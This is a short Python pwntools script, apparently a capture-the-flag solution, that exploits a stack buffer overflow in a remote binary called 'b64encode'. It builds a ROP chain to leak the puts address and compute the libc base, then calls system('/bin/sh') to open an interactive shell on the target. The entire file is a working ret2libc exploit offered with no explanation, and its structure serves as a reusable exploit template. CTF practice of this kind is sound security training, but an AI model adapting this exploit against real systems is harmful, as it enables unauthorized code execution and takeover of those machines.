#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
binary_name = 'b64encode'

if local:
	cn = process('./b64encode')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)
else:	
	libc = ELF('libc.so.6',checksec=False)
	cn = remote('ctf.qiuyitech.com',6666)
	#libc = ELF('')

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)


bin = ELF('./'+binary_name,checksec=False)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

buf = 'a'*0x38
buf+= p64(0x400ee3) + p64(0x602020) + p64(bin.plt['puts'])
buf+= p64(bin.sym['main'])
cn.sendline(buf)

for i in range(2):
	cn.recvuntil('=============================================================\n\n')
lbase = u64(cn.recv(6).ljust(8,'\x00')) - libc.sym['puts']
success('lbase:'+hex(lbase))


system = lbase + libc.sym['system']
binsh = lbase + libc.search('/bin/sh\x00').next()
buf = 'a'*0x38
buf+= p64(0x400ee3) + p64(binsh) + p64(system) 
cn.sendline(buf)
cn.interactive()
